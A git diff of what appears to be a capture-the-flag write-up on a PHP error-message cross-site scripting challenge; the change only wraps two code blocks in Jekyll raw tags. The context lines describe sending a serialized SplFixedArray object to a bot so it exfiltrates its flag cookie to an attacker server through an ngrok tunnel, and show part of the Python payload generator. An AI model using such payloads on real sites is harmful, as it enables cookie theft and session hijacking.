@@ -324,7 +324,7 @@ PHPAPI ZEND_COLD void php_error_docref(const char *docref, int type, const char 
 ```
 
 Which calls [marco](https://www.geeksforgeeks.org/c/macros-and-its-types-in-c-cpp/) [`php_error_docref_impl`](https://github.com/php/php-src/blob/PHP-8.4.10/main/main.c#L1164-L1171):
-
+{% raw %}
 ```c
 /* {{{ php_error_docref */
 /* Generate an error which links to docref or the php.net documentation if docref is NULL */
@@ -335,6 +335,7 @@ Which calls [marco](https://www.geeksforgeeks.org/c/macros-and-its-types-in-c-cp
 		va_end(args); \
 	} while (0)
 ```
+{% endraw %}
 
 In function [`php_verror`](https://github.com/php/php-src/blob/PHP-8.4.10/main/main.c#L992), it'll first format the error message's string and store it in pointer variable `buffer`, which will then passed to function `escape_html`:
 
@@ -630,7 +631,7 @@ Forwarding                    tcp://0.tcp.jp.ngrok.io:16499 -> localhost:8000
 - Send the following serialized object string to the bot, which exfiltrate the `flag` cookie to our attacker server:
 
 Payload generator:
-
+{% raw %}
 ```python
 from urllib.parse import quote_plus
 
@@ -640,6 +641,7 @@ serializedObjectString = f'O:13:"SplFixedArray":1:{{s:{len(xssPayload)}:"{xssPay
 print(f'Serialized object string: {serializedObjectString}')
 print(f'Serialized object string (URL encoded): {quote_plus(serializedObjectString)}')
 ```
+{% endraw %}
 
 Serialized object string:
 
